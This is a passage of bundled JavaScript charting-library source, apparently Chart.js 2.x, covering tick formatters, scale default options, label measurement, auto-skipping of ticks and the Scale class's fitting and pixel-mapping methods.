      _create: function (value) {
        return value;
      },
    }
  );

  DateAdapter.override = function (members) {
    helpers$1.extend(DateAdapter.prototype, members);
  };

  var _date = DateAdapter;

  var core_adapters = {
    _date: _date,
  };

  /**
   * Namespace to hold static tick generation functions
   * @namespace Chart.Ticks
   */
  var core_ticks = {
    /**
     * Namespace to hold formatters for different types of ticks
     * @namespace Chart.Ticks.formatters
     */
    formatters: {
      /**
       * Formatter for value labels
       * @method Chart.Ticks.formatters.values
       * @param value the value to display
       * @return {string|string[]} the label to display
       */
      values: function (value) {
        return helpers$1.isArray(value) ? value : "" + value;
      },

      /**
       * Formatter for linear numeric ticks
       * @method Chart.Ticks.formatters.linear
       * @param tickValue {number} the value to be formatted
       * @param index {number} the position of the tickValue parameter in the ticks array
       * @param ticks {number[]} the list of ticks being converted
       * @return {string} string representation of the tickValue parameter
       */
      linear: function (tickValue, index, ticks) {
        // If we have lots of ticks, don't use the ones
        var delta =
          ticks.length > 3 ? ticks[2] - ticks[1] : ticks[1] - ticks[0];

        // If we have a number like 2.5 as the delta, figure out how many decimal places we need
        if (Math.abs(delta) > 1) {
          if (tickValue !== Math.floor(tickValue)) {
            // not an integer
            delta = tickValue - Math.floor(tickValue);
          }
        }

        var logDelta = helpers$1.log10(Math.abs(delta));
        var tickString = "";

        if (tickValue !== 0) {
          var maxTick = Math.max(
            Math.abs(ticks[0]),
            Math.abs(ticks[ticks.length - 1])
          );
          if (maxTick < 1e-4) {
            // all ticks are small numbers; use scientific notation
            var logTick = helpers$1.log10(Math.abs(tickValue));
            var numExponential = Math.floor(logTick) - Math.floor(logDelta);
            numExponential = Math.max(Math.min(numExponential, 20), 0);
            tickString = tickValue.toExponential(numExponential);
          } else {
            var numDecimal = -1 * Math.floor(logDelta);
            numDecimal = Math.max(Math.min(numDecimal, 20), 0); // toFixed has a max of 20 decimal places
            tickString = tickValue.toFixed(numDecimal);
          }
        } else {
          tickString = "0"; // never show decimal places for 0
        }

        return tickString;
      },

      logarithmic: function (tickValue, index, ticks) {
        var remain =
          tickValue / Math.pow(10, Math.floor(helpers$1.log10(tickValue)));

        if (tickValue === 0) {
          return "0";
        } else if (
          remain === 1 ||
          remain === 2 ||
          remain === 5 ||
          index === 0 ||
          index === ticks.length - 1
        ) {
          return tickValue.toExponential();
        }
        return "";
      },
    },
  };

  var isArray = helpers$1.isArray;
  var isNullOrUndef = helpers$1.isNullOrUndef;
  var valueOrDefault$a = helpers$1.valueOrDefault;
  var valueAtIndexOrDefault = helpers$1.valueAtIndexOrDefault;

  core_defaults._set("scale", {
    display: true,
    position: "left",
    offset: false,

    // grid line settings
    gridLines: {
      display: true,
      color: "rgba(0,0,0,0.1)",
      lineWidth: 1,
      drawBorder: true,
      drawOnChartArea: true,
      drawTicks: true,
      tickMarkLength: 10,
      zeroLineWidth: 1,
      zeroLineColor: "rgba(0,0,0,0.25)",
      zeroLineBorderDash: [],
      zeroLineBorderDashOffset: 0.0,
      offsetGridLines: false,
      borderDash: [],
      borderDashOffset: 0.0,
    },

    // scale label
    scaleLabel: {
      // display property
      display: false,

      // actual label
      labelString: "",

      // top/bottom padding
      padding: {
        top: 4,
        bottom: 4,
      },
    },

    // label settings
    ticks: {
      beginAtZero: false,
      minRotation: 0,
      maxRotation: 50,
      mirror: false,
      padding: 0,
      reverse: false,
      display: true,
      autoSkip: true,
      autoSkipPadding: 0,
      labelOffset: 0,
      // We pass through arrays to be rendered as multiline labels, we convert Others to strings here.
      callback: core_ticks.formatters.values,
      minor: {},
      major: {},
    },
  });

  /** Returns a new array containing numItems from arr */
  function sample(arr, numItems) {
    var result = [];
    var increment = arr.length / numItems;
    var i = 0;
    var len = arr.length;

    for (; i < len; i += increment) {
      result.push(arr[Math.floor(i)]);
    }
    return result;
  }

  function getPixelForGridLine(scale, index, offsetGridLines) {
    var length = scale.getTicks().length;
    var validIndex = Math.min(index, length - 1);
    var lineValue = scale.getPixelForTick(validIndex);
    var start = scale._startPixel;
    var end = scale._endPixel;
    var epsilon = 1e-6; // 1e-6 is margin in pixels for accumulated error.
    var offset;

    if (offsetGridLines) {
      if (length === 1) {
        offset = Math.max(lineValue - start, end - lineValue);
      } else if (index === 0) {
        offset = (scale.getPixelForTick(1) - lineValue) / 2;
      } else {
        offset = (lineValue - scale.getPixelForTick(validIndex - 1)) / 2;
      }
      lineValue += validIndex < index ? offset : -offset;

      // Return undefined if the pixel is out of the range
      if (lineValue < start - epsilon || lineValue > end + epsilon) {
        return;
      }
    }
    return lineValue;
  }

  function garbageCollect(caches, length) {
    helpers$1.each(caches, function (cache) {
      var gc = cache.gc;
      var gcLen = gc.length / 2;
      var i;
      if (gcLen > length) {
        for (i = 0; i < gcLen; ++i) {
          delete cache.data[gc[i]];
        }
        gc.splice(0, gcLen);
      }
    });
  }

  /**
   * Returns {width, height, offset} objects for the first, last, widest, highest tick
   * labels where offset indicates the anchor point offset from the top in pixels.
   */
  function computeLabelSizes(ctx, tickFonts, ticks, caches) {
    var length = ticks.length;
    var widths = [];
    var heights = [];
    var offsets = [];
    var widestLabelSize = 0;
    var highestLabelSize = 0;
    var i,
      j,
      jlen,
      label,
      tickFont,
      fontString,
      cache,
      lineHeight,
      width,
      height,
      nestedLabel,
      widest,
      highest;

    for (i = 0; i < length; ++i) {
      label = ticks[i].label;
      tickFont = ticks[i].major ? tickFonts.major : tickFonts.minor;
      ctx.font = fontString = tickFont.string;
      cache = caches[fontString] = caches[fontString] || { data: {}, gc: [] };
      lineHeight = tickFont.lineHeight;
      width = height = 0;
      // Undefined labels and arrays should not be measured
      if (!isNullOrUndef(label) && !isArray(label)) {
        width = helpers$1.measureText(ctx, cache.data, cache.gc, width, label);
        height = lineHeight;
      } else if (isArray(label)) {
        // if it is an array let's measure each element
        for (j = 0, jlen = label.length; j < jlen; ++j) {
          nestedLabel = label[j];
          // Undefined labels and arrays should not be measured
          if (!isNullOrUndef(nestedLabel) && !isArray(nestedLabel)) {
            width = helpers$1.measureText(
              ctx,
              cache.data,
              cache.gc,
              width,
              nestedLabel
            );
            height += lineHeight;
          }
        }
      }
      widths.push(width);
      heights.push(height);
      offsets.push(lineHeight / 2);
      widestLabelSize = Math.max(width, widestLabelSize);
      highestLabelSize = Math.max(height, highestLabelSize);
    }
    garbageCollect(caches, length);

    widest = widths.indexOf(widestLabelSize);
    highest = heights.indexOf(highestLabelSize);

    function valueAt(idx) {
      return {
        width: widths[idx] || 0,
        height: heights[idx] || 0,
        offset: offsets[idx] || 0,
      };
    }

    return {
      first: valueAt(0),
      last: valueAt(length - 1),
      widest: valueAt(widest),
      highest: valueAt(highest),
    };
  }

  function getTickMarkLength(options) {
    return options.drawTicks ? options.tickMarkLength : 0;
  }

  function getScaleLabelHeight(options) {
    var font, padding;

    if (!options.display) {
      return 0;
    }

    font = helpers$1.options._parseFont(options);
    padding = helpers$1.options.toPadding(options.padding);

    return font.lineHeight + padding.height;
  }

  function parseFontOptions(options, nestedOpts) {
    return helpers$1.extend(
      helpers$1.options._parseFont({
        fontFamily: valueOrDefault$a(nestedOpts.fontFamily, options.fontFamily),
        fontSize: valueOrDefault$a(nestedOpts.fontSize, options.fontSize),
        fontStyle: valueOrDefault$a(nestedOpts.fontStyle, options.fontStyle),
        lineHeight: valueOrDefault$a(nestedOpts.lineHeight, options.lineHeight),
      }),
      {
        color: helpers$1.options.resolve([
          nestedOpts.fontColor,
          options.fontColor,
          core_defaults.global.defaultFontColor,
        ]),
      }
    );
  }

  function parseTickFontOptions(options) {
    var minor = parseFontOptions(options, options.minor);
    var major = options.major.enabled
      ? parseFontOptions(options, options.major)
      : minor;

    return { minor: minor, major: major };
  }

  function nonSkipped(ticksToFilter) {
    var filtered = [];
    var item, index, len;
    for (index = 0, len = ticksToFilter.length; index < len; ++index) {
      item = ticksToFilter[index];
      if (typeof item._index !== "undefined") {
        filtered.push(item);
      }
    }
    return filtered;
  }

  function getEvenSpacing(arr) {
    var len = arr.length;
    var i, diff;

    if (len < 2) {
      return false;
    }

    for (diff = arr[0], i = 1; i < len; ++i) {
      if (arr[i] - arr[i - 1] !== diff) {
        return false;
      }
    }
    return diff;
  }

  function calculateSpacing(majorIndices, ticks, axisLength, ticksLimit) {
    var evenMajorSpacing = getEvenSpacing(majorIndices);
    var spacing = (ticks.length - 1) / ticksLimit;
    var factors, factor, i, ilen;

    // If the major ticks are evenly spaced apart, place the minor ticks
    // so that they divide the major ticks into even chunks
    if (!evenMajorSpacing) {
      return Math.max(spacing, 1);
    }

    factors = helpers$1.math._factorize(evenMajorSpacing);
    for (i = 0, ilen = factors.length - 1; i < ilen; i++) {
      factor = factors[i];
      if (factor > spacing) {
        return factor;
      }
    }
    return Math.max(spacing, 1);
  }

  function getMajorIndices(ticks) {
    var result = [];
    var i, ilen;
    for (i = 0, ilen = ticks.length; i < ilen; i++) {
      if (ticks[i].major) {
        result.push(i);
      }
    }
    return result;
  }

  function skipMajors(ticks, majorIndices, spacing) {
    var count = 0;
    var next = majorIndices[0];
    var i, tick;

    spacing = Math.ceil(spacing);
    for (i = 0; i < ticks.length; i++) {
      tick = ticks[i];
      if (i === next) {
        tick._index = i;
        count++;
        next = majorIndices[count * spacing];
      } else {
        delete tick.label;
      }
    }
  }

  function skip(ticks, spacing, majorStart, majorEnd) {
    var start = valueOrDefault$a(majorStart, 0);
    var end = Math.min(valueOrDefault$a(majorEnd, ticks.length), ticks.length);
    var count = 0;
    var length, i, tick, next;

    spacing = Math.ceil(spacing);
    if (majorEnd) {
      length = majorEnd - majorStart;
      spacing = length / Math.floor(length / spacing);
    }

    next = start;

    while (next < 0) {
      count++;
      next = Math.round(start + count * spacing);
    }

    for (i = Math.max(start, 0); i < end; i++) {
      tick = ticks[i];
      if (i === next) {
        tick._index = i;
        count++;
        next = Math.round(start + count * spacing);
      } else {
        delete tick.label;
      }
    }
  }

  var Scale = core_element.extend({
    zeroLineIndex: 0,

    /**
     * Get the padding needed for the scale
     * @method getPadding
     * @private
     * @returns {Padding} the necessary padding
     */
    getPadding: function () {
      var me = this;
      return {
        left: me.paddingLeft || 0,
        top: me.paddingTop || 0,
        right: me.paddingRight || 0,
        bottom: me.paddingBottom || 0,
      };
    },

    /**
     * Returns the scale tick objects ({label, major})
     * @since 2.7
     */
    getTicks: function () {
      return this._ticks;
    },

    /**
     * @private
     */
    _getLabels: function () {
      var data = this.chart.data;
      return (
        this.options.labels ||
        (this.isHorizontal() ? data.xLabels : data.yLabels) ||
        data.labels ||
        []
      );
    },

    // These methods are ordered by lifecyle. Utilities then follow.
    // Any function defined here is inherited by all scale types.
    // Any function can be extended by the scale type

    /**
     * Provided for backward compatibility, not available anymore
     * @function Chart.Scale.mergeTicksOptions
     * @deprecated since version 2.8.0
     * @todo remove at version 3
     */
    mergeTicksOptions: function () {
      // noop
    },

    beforeUpdate: function () {
      helpers$1.callback(this.options.beforeUpdate, [this]);
    },

    /**
     * @param {number} maxWidth - the max width in pixels
     * @param {number} maxHeight - the max height in pixels
     * @param {object} margins - the space between the edge of the other scales and edge of the chart
     *   This space comes from two sources:
     *     - padding - space that's required to show the labels at the edges of the scale
     *     - thickness of scales or legends in another orientation
     */
    update: function (maxWidth, maxHeight, margins) {
      var me = this;
      var tickOpts = me.options.ticks;
      var sampleSize = tickOpts.sampleSize;
      var i, ilen, labels, ticks, samplingEnabled;

      // Update Lifecycle - Probably don't want to ever extend or overwrite this function ;)
      me.beforeUpdate();

      // Absorb the master measurements
      me.maxWidth = maxWidth;
      me.maxHeight = maxHeight;
      me.margins = helpers$1.extend(
        {
          left: 0,
          right: 0,
          top: 0,
          bottom: 0,
        },
        margins
      );

      me._ticks = null;
      me.ticks = null;
      me._labelSizes = null;
      me._maxLabelLines = 0;
      me.longestLabelWidth = 0;
      me.longestTextCache = me.longestTextCache || {};
      me._gridLineItems = null;
      me._labelItems = null;

      // Dimensions
      me.beforeSetDimensions();
      me.setDimensions();
      me.afterSetDimensions();

      // Data min/max
      me.beforeDataLimits();
      me.determineDataLimits();
      me.afterDataLimits();

      // Ticks - `this.ticks` is now DEPRECATED!
      // Internal ticks are now stored as objects in the PRIVATE `this._ticks` member
      // and must not be accessed directly from outside this class. `this.ticks` being
      // around for long time and not marked as private, we can't change its structure
      // without unexpected breaking changes. If you need to access the scale ticks,
      // use scale.getTicks() instead.

      me.beforeBuildTicks();

      // New implementations should return an array of objects but for BACKWARD COMPAT,
      // we still support no return (`this.ticks` internally set by calling this method).
      ticks = me.buildTicks() || [];

      // Allow modification of ticks in callback.
      ticks = me.afterBuildTicks(ticks) || ticks;

      // Ensure ticks contains ticks in new tick format
      if ((!ticks || !ticks.length) && me.ticks) {
        ticks = [];
        for (i = 0, ilen = me.ticks.length; i < ilen; ++i) {
          ticks.push({
            value: me.ticks[i],
            major: false,
          });
        }
      }

      me._ticks = ticks;

      // Compute tick rotation and fit using a sampled subset of labels
      // We generally don't need to compute the size of every single label for determining scale size
      samplingEnabled = sampleSize < ticks.length;
      labels = me._convertTicksToLabels(
        samplingEnabled ? sample(ticks, sampleSize) : ticks
      );

      // _configure is called twice, once here, once from core.controller.updateLayout.
      // Here we haven't been positioned yet, but dimensions are correct.
      // Variables set in _configure are needed for calculateTickRotation, and
      // it's ok that coordinates are not correct there, only dimensions matter.
      me._configure();

      // Tick Rotation
      me.beforeCalculateTickRotation();
      me.calculateTickRotation();
      me.afterCalculateTickRotation();

      me.beforeFit();
      me.fit();
      me.afterFit();

      // Auto-skip
      me._ticksToDraw =
        tickOpts.display && (tickOpts.autoSkip || tickOpts.source === "auto")
          ? me._autoSkip(ticks)
          : ticks;

      if (samplingEnabled) {
        // Generate labels using all non-skipped ticks
        labels = me._convertTicksToLabels(me._ticksToDraw);
      }

      me.ticks = labels; // BACKWARD COMPATIBILITY

      // IMPORTANT: after this point, we consider that `this.ticks` will NEVER change!

      me.afterUpdate();

      // TODO(v3): remove minSize as a public property and return value from all layout boxes. It is unused
      // make maxWidth and maxHeight private
      return me.minSize;
    },

    /**
     * @private
     */
    _configure: function () {
      var me = this;
      var reversePixels = me.options.ticks.reverse;
      var startPixel, endPixel;

      if (me.isHorizontal()) {
        startPixel = me.left;
        endPixel = me.right;
      } else {
        startPixel = me.top;
        endPixel = me.bottom;
        // by default vertical scales are from bottom to top, so pixels are reversed
        reversePixels = !reversePixels;
      }
      me._startPixel = startPixel;
      me._endPixel = endPixel;
      me._reversePixels = reversePixels;
      me._length = endPixel - startPixel;
    },

    afterUpdate: function () {
      helpers$1.callback(this.options.afterUpdate, [this]);
    },

    //

    beforeSetDimensions: function () {
      helpers$1.callback(this.options.beforeSetDimensions, [this]);
    },
    setDimensions: function () {
      var me = this;
      // Set the unconstrained dimension before label rotation
      if (me.isHorizontal()) {
        // Reset position before calculating rotation
        me.width = me.maxWidth;
        me.left = 0;
        me.right = me.width;
      } else {
        me.height = me.maxHeight;

        // Reset position before calculating rotation
        me.top = 0;
        me.bottom = me.height;
      }

      // Reset padding
      me.paddingLeft = 0;
      me.paddingTop = 0;
      me.paddingRight = 0;
      me.paddingBottom = 0;
    },
    afterSetDimensions: function () {
      helpers$1.callback(this.options.afterSetDimensions, [this]);
    },

    // Data limits
    beforeDataLimits: function () {
      helpers$1.callback(this.options.beforeDataLimits, [this]);
    },
    determineDataLimits: helpers$1.noop,
    afterDataLimits: function () {
      helpers$1.callback(this.options.afterDataLimits, [this]);
    },

    //
    beforeBuildTicks: function () {
      helpers$1.callback(this.options.beforeBuildTicks, [this]);
    },
    buildTicks: helpers$1.noop,
    afterBuildTicks: function (ticks) {
      var me = this;
      // ticks is empty for old axis implementations here
      if (isArray(ticks) && ticks.length) {
        return helpers$1.callback(me.options.afterBuildTicks, [me, ticks]);
      }
      // Support old implementations (that modified `this.ticks` directly in buildTicks)
      me.ticks =
        helpers$1.callback(me.options.afterBuildTicks, [me, me.ticks]) ||
        me.ticks;
      return ticks;
    },

    beforeTickToLabelConversion: function () {
      helpers$1.callback(this.options.beforeTickToLabelConversion, [this]);
    },
    convertTicksToLabels: function () {
      var me = this;
      // Convert ticks to strings
      var tickOpts = me.options.ticks;
      me.ticks = me.ticks.map(tickOpts.userCallback || tickOpts.callback, this);
    },
    afterTickToLabelConversion: function () {
      helpers$1.callback(this.options.afterTickToLabelConversion, [this]);
    },

    //

    beforeCalculateTickRotation: function () {
      helpers$1.callback(this.options.beforeCalculateTickRotation, [this]);
    },
    calculateTickRotation: function () {
      var me = this;
      var options = me.options;
      var tickOpts = options.ticks;
      var numTicks = me.getTicks().length;
      var minRotation = tickOpts.minRotation || 0;
      var maxRotation = tickOpts.maxRotation;
      var labelRotation = minRotation;
      var labelSizes,
        maxLabelWidth,
        maxLabelHeight,
        maxWidth,
        tickWidth,
        maxHeight,
        maxLabelDiagonal;

      if (
        !me._isVisible() ||
        !tickOpts.display ||
        minRotation >= maxRotation ||
        numTicks <= 1 ||
        !me.isHorizontal()
      ) {
        me.labelRotation = minRotation;
        return;
      }

      labelSizes = me._getLabelSizes();
      maxLabelWidth = labelSizes.widest.width;
      maxLabelHeight = labelSizes.highest.height - labelSizes.highest.offset;

      // Estimate the width of each grid based on the canvas width, the maximum
      // label width and the number of tick intervals
      maxWidth = Math.min(me.maxWidth, me.chart.width - maxLabelWidth);
      tickWidth = options.offset
        ? me.maxWidth / numTicks
        : maxWidth / (numTicks - 1);

      // Allow 3 pixels x2 padding either side for label readability
      if (maxLabelWidth + 6 > tickWidth) {
        tickWidth = maxWidth / (numTicks - (options.offset ? 0.5 : 1));
        maxHeight =
          me.maxHeight -
          getTickMarkLength(options.gridLines) -
          tickOpts.padding -
          getScaleLabelHeight(options.scaleLabel);
        maxLabelDiagonal = Math.sqrt(
          maxLabelWidth * maxLabelWidth + maxLabelHeight * maxLabelHeight
        );
        labelRotation = helpers$1.toDegrees(
          Math.min(
            Math.asin(Math.min((labelSizes.highest.height + 6) / tickWidth, 1)),
            Math.asin(Math.min(maxHeight / maxLabelDiagonal, 1)) -
              Math.asin(maxLabelHeight / maxLabelDiagonal)
          )
        );
        labelRotation = Math.max(
          minRotation,
          Math.min(maxRotation, labelRotation)
        );
      }

      me.labelRotation = labelRotation;
    },
    afterCalculateTickRotation: function () {
      helpers$1.callback(this.options.afterCalculateTickRotation, [this]);
    },

    //

    beforeFit: function () {
      helpers$1.callback(this.options.beforeFit, [this]);
    },
    fit: function () {
      var me = this;
      // Reset
      var minSize = (me.minSize = {
        width: 0,
        height: 0,
      });

      var chart = me.chart;
      var opts = me.options;
      var tickOpts = opts.ticks;
      var scaleLabelOpts = opts.scaleLabel;
      var gridLineOpts = opts.gridLines;
      var display = me._isVisible();
      var isBottom = opts.position === "bottom";
      var isHorizontal = me.isHorizontal();

      // Width
      if (isHorizontal) {
        minSize.width = me.maxWidth;
      } else if (display) {
        minSize.width =
          getTickMarkLength(gridLineOpts) + getScaleLabelHeight(scaleLabelOpts);
      }

      // height
      if (!isHorizontal) {
        minSize.height = me.maxHeight; // fill all the height
      } else if (display) {
        minSize.height =
          getTickMarkLength(gridLineOpts) + getScaleLabelHeight(scaleLabelOpts);
      }

      // Don't bother fitting the ticks if we are not showing the labels
      if (tickOpts.display && display) {
        var tickFonts = parseTickFontOptions(tickOpts);
        var labelSizes = me._getLabelSizes();
        var firstLabelSize = labelSizes.first;
        var lastLabelSize = labelSizes.last;
        var widestLabelSize = labelSizes.widest;
        var highestLabelSize = labelSizes.highest;
        var lineSpace = tickFonts.minor.lineHeight * 0.4;
        var tickPadding = tickOpts.padding;

        if (isHorizontal) {
          // A horizontal axis is more constrained by the height.
          var isRotated = me.labelRotation !== 0;
          var angleRadians = helpers$1.toRadians(me.labelRotation);
          var cosRotation = Math.cos(angleRadians);
          var sinRotation = Math.sin(angleRadians);

          var labelHeight =
            sinRotation * widestLabelSize.width +
            cosRotation *
              (highestLabelSize.height -
                (isRotated ? highestLabelSize.offset : 0)) +
            (isRotated ? 0 : lineSpace); // padding

          minSize.height = Math.min(
            me.maxHeight,
            minSize.height + labelHeight + tickPadding
          );

          var offsetLeft = me.getPixelForTick(0) - me.left;
          var offsetRight =
            me.right - me.getPixelForTick(me.getTicks().length - 1);
          var paddingLeft, paddingRight;

          // Ensure that our ticks are always inside the canvas. When rotated, ticks are right aligned
          // which means that the right padding is dominated by the font height
          if (isRotated) {
            paddingLeft = isBottom
              ? cosRotation * firstLabelSize.width +
                sinRotation * firstLabelSize.offset
              : sinRotation * (firstLabelSize.height - firstLabelSize.offset);
            paddingRight = isBottom
              ? sinRotation * (lastLabelSize.height - lastLabelSize.offset)
              : cosRotation * lastLabelSize.width +
                sinRotation * lastLabelSize.offset;
          } else {
            paddingLeft = firstLabelSize.width / 2;
            paddingRight = lastLabelSize.width / 2;
          }

          // Adjust padding taking into account changes in offsets
          // and add 3 px to move away from canvas edges
          me.paddingLeft =
            Math.max(
              ((paddingLeft - offsetLeft) * me.width) / (me.width - offsetLeft),
              0
            ) + 3;
          me.paddingRight =
            Math.max(
              ((paddingRight - offsetRight) * me.width) /
                (me.width - offsetRight),
              0
            ) + 3;
        } else {
          // A vertical axis is more constrained by the width. Labels are the
          // dominant factor here, so get that length first and account for padding
          var labelWidth = tickOpts.mirror
            ? 0
            : // use lineSpace for consistency with horizontal axis
              // tickPadding is not implemented for horizontal
              widestLabelSize.width + tickPadding + lineSpace;

          minSize.width = Math.min(me.maxWidth, minSize.width + labelWidth);

          me.paddingTop = firstLabelSize.height / 2;
          me.paddingBottom = lastLabelSize.height / 2;
        }
      }

      me.handleMargins();

      if (isHorizontal) {
        me.width = me._length =
          chart.width - me.margins.left - me.margins.right;
        me.height = minSize.height;
      } else {
        me.width = minSize.width;
        me.height = me._length =
          chart.height - me.margins.top - me.margins.bottom;
      }
    },

    /**
     * Handle margins and padding interactions
     * @private
     */
    handleMargins: function () {
      var me = this;
      if (me.margins) {
        me.margins.left = Math.max(me.paddingLeft, me.margins.left);
        me.margins.top = Math.max(me.paddingTop, me.margins.top);
        me.margins.right = Math.max(me.paddingRight, me.margins.right);
        me.margins.bottom = Math.max(me.paddingBottom, me.margins.bottom);
      }
    },

    afterFit: function () {
      helpers$1.callback(this.options.afterFit, [this]);
    },

    // Shared Methods
    isHorizontal: function () {
      var pos = this.options.position;
      return pos === "top" || pos === "bottom";
    },
    isFullWidth: function () {
      return this.options.fullWidth;
    },

    // Get the correct value. NaN bad inputs, If the value type is object get the x or y based on whether we are horizontal or not
    getRightValue: function (rawValue) {
      // Null and undefined values first
      if (isNullOrUndef(rawValue)) {
        return NaN;
      }
      // isNaN(object) returns true, so make sure NaN is checking for a number; Discard Infinite values
      if (
        (typeof rawValue === "number" || rawValue instanceof Number) &&
        !isFinite(rawValue)
      ) {
        return NaN;
      }

      // If it is in fact an object, dive in one more level
      if (rawValue) {
        if (this.isHorizontal()) {
          if (rawValue.x !== undefined) {
            return this.getRightValue(rawValue.x);
          }
        } else if (rawValue.y !== undefined) {
          return this.getRightValue(rawValue.y);
        }
      }

      // Value is good, return it
      return rawValue;
    },

    _convertTicksToLabels: function (ticks) {
      var me = this;
      var labels, i, ilen;

      me.ticks = ticks.map(function (tick) {
        return tick.value;
      });

      me.beforeTickToLabelConversion();

      // New implementations should return the formatted tick labels but for BACKWARD
      // COMPAT, we still support no return (`this.ticks` internally changed by calling
      // this method and supposed to contain only string values).
      labels = me.convertTicksToLabels(ticks) || me.ticks;

      me.afterTickToLabelConversion();

      // BACKWARD COMPAT: synchronize `_ticks` with labels (so potentially `this.ticks`)
      for (i = 0, ilen = ticks.length; i < ilen; ++i) {
        ticks[i].label = labels[i];
      }

      return labels;
    },

    /**
     * @private
     */
    _getLabelSizes: function () {
      var me = this;
      var labelSizes = me._labelSizes;

      if (!labelSizes) {
        me._labelSizes = labelSizes = computeLabelSizes(
          me.ctx,
          parseTickFontOptions(me.options.ticks),
          me.getTicks(),
          me.longestTextCache
        );
        me.longestLabelWidth = labelSizes.widest.width;
      }

      return labelSizes;
    },

    /**
     * @private
     */
    _parseValue: function (value) {
      var start, end, min, max;

      if (isArray(value)) {
        start = +this.getRightValue(value[0]);
        end = +this.getRightValue(value[1]);
        min = Math.min(start, end);
        max = Math.max(start, end);
      } else {
        value = +this.getRightValue(value);
        start = undefined;
        end = value;
        min = value;
        max = value;
      }

      return {
        min: min,
        max: max,
        start: start,
        end: end,
      };
    },

    /**
     * @private
     */
    _getScaleLabel: function (rawValue) {
      var v = this._parseValue(rawValue);
      if (v.start !== undefined) {
        return "[" + v.start + ", " + v.end + "]";
      }

      return +this.getRightValue(rawValue);
    },

    /**
     * Used to get the value to display in the tooltip for the data at the given index
     * @param index
     * @param datasetIndex
     */
    getLabelForIndex: helpers$1.noop,

    /**
     * Returns the location of the given data point. Value can either be an index or a numerical value
     * The coordinate (0, 0) is at the upper-left corner of the canvas
     * @param value
     * @param index
     * @param datasetIndex
     */
    getPixelForValue: helpers$1.noop,

    /**
     * Used to get the data value from a given pixel. This is the inverse of getPixelForValue
     * The coordinate (0, 0) is at the upper-left corner of the canvas
     * @param pixel
     */
    getValueForPixel: helpers$1.noop,

    /**
     * Returns the location of the tick at the given index
     * The coordinate (0, 0) is at the upper-left corner of the canvas
     */
    getPixelForTick: function (index) {
      var me = this;
      var offset = me.options.offset;
      var numTicks = me._ticks.length;
      var tickWidth = 1 / Math.max(numTicks - (offset ? 0 : 1), 1);

      return index < 0 || index > numTicks - 1
        ? null
        : me.getPixelForDecimal(
            index * tickWidth + (offset ? tickWidth / 2 : 0)
          );
    },

    /**
     * Utility for getting the pixel location of a percentage of scale
     * The coordinate (0, 0) is at the upper-left corner of the canvas
     */
    getPixelForDecimal: function (decimal) {
      var me = this;

      if (me._reversePixels) {
        decimal = 1 - decimal;
      }

      return me._startPixel + decimal * me._length;
    },

    getDecimalForPixel: function (pixel) {
      var decimal = (pixel - this._startPixel) / this._length;
      return this._reversePixels ? 1 - decimal : decimal;
    },

    /**
     * Returns the pixel for the minimum chart value
     * The coordinate (0, 0) is at the upper-left corner of the canvas
     */
    getBasePixel: function () {
      return this.getPixelForValue(this.getBaseValue());
    },

    getBaseValue: function () {
      var me = this;
      var min = me.min;
      var max = me.max;

      return me.beginAtZero
        ? 0
        : min < 0 && max < 0
        ? max
        : min > 0 && max > 0
        ? min
        : 0;
    },

    /**
     * Returns a subset of ticks to be plotted to avoid overlapping labels.
     * @private
     */
    _autoSkip: function (ticks) {
      var me = this;
      var tickOpts = me.options.ticks;
      var axisLength = me._length;
      var ticksLimit =
        tickOpts.maxTicksLimit || axisLength / me._tickSize() + 1;
      var majorIndices = tickOpts.major.enabled ? getMajorIndices(ticks) : [];
      var numMajorIndices = majorIndices.length;
      var first = majorIndices[0];
      var last = majorIndices[numMajorIndices - 1];
      var i, ilen, spacing, avgMajorSpacing;

      // If there are too many major ticks to display them all
      if (numMajorIndices > ticksLimit) {
        skipMajors(ticks, majorIndices, numMajorIndices / ticksLimit);
        return nonSkipped(ticks);
      }

      spacing = calculateSpacing(majorIndices, ticks, axisLength, ticksLimit);

      if (numMajorIndices > 0) {
        for (i = 0, ilen = numMajorIndices - 1; i < ilen; i++) {
          skip(ticks, spacing, majorIndices[i], majorIndices[i + 1]);
        }
        avgMajorSpacing =
          numMajorIndices > 1 ? (last - first) / (numMajorIndices - 1) : null;
        skip(
          ticks,
          spacing,
          helpers$1.isNullOrUndef(avgMajorSpacing)
            ? 0
            : first - avgMajorSpacing,
          first
        );
        skip(
          ticks,
          spacing,
          last,
          helpers$1.isNullOrUndef(avgMajorSpacing)
            ? ticks.length
            : last + avgMajorSpacing
        );
        return nonSkipped(ticks);
      }
      skip(ticks, spacing);
      return nonSkipped(ticks);
    },

    /**
     * @private
     */
    _tickSize: function () {
      var me = this;
      var optionTicks = me.options.ticks;

      // Calculate space needed by label in axis direction.
      var rot = helpers$1.toRadians(me.labelRotation);
      var cos = Math.abs(Math.cos(rot));
      var sin = Math.abs(Math.sin(rot));

      var labelSizes = me._getLabelSizes();
      var padding = optionTicks.autoSkipPadding || 0;
      var w = labelSizes ? labelSizes.widest.width + padding : 0;
      var h = labelSizes ? labelSizes.highest.height + padding : 0;

      // Calculate space needed for 1 tick in axis direction.
      return me.isHorizontal()
        ? h * cos > w * sin
          ? w / cos
          : h / sin
        : h * sin < w * cos
        ? h / cos
        : w / sin;
    },

    /**
     * @private
     */
    _isVisible: function () {
      var me = this;
      var chart = me.chart;
      var display = me.options.display;
      var i, ilen, meta;

      if (display !== "auto") {
        return !!display;
      }

      // When 'auto', the scale is visible if at least one associated dataset is visible.
      for (i = 0, ilen = chart.data.datasets.length; i < ilen; ++i) {
        if (chart.isDatasetVisible(i)) {
          meta = chart.getDatasetMeta(i);
          if (meta.xAxisID === me.id || meta.yAxisID === me.id) {
            return true;
          }
        }
      }

      return false;
    },

    /**
     * @private
     */
    _computeGridLineItems: function (chartArea) {
      var me = this;
      var chart = me.chart;
      var options = me.options;
      var gridLines = options.gridLines;
      var position = options.position;
      var offsetGridLines = gridLines.offsetGridLines;
      var isHorizontal = me.isHorizontal();
      var ticks = me._ticksToDraw;
      var ticksLength = ticks.length + (offsetGridLines ? 1 : 0);

      var tl = getTickMarkLength(gridLines);
      var items = [];
      var axisWidth = gridLines.drawBorder
        ? valueAtIndexOrDefault(gridLines.lineWidth, 0, 0)
        : 0;
      var axisHalfWidth = axisWidth / 2;
      var alignPixel = helpers$1._alignPixel;
      var alignBorderValue = function (pixel) {
        return alignPixel(chart, pixel, axisWidth);
      };
      var borderValue, i, tick, lineValue, alignedLineValue;
      var tx1,
        ty1,
        tx2,
        ty2,
        x1,
        y1,
        x2,
        y2,
        lineWidth,
        lineColor,
        borderDash,
        borderDashOffset;

      if (position === "top") {
        borderValue = alignBorderValue(me.bottom);
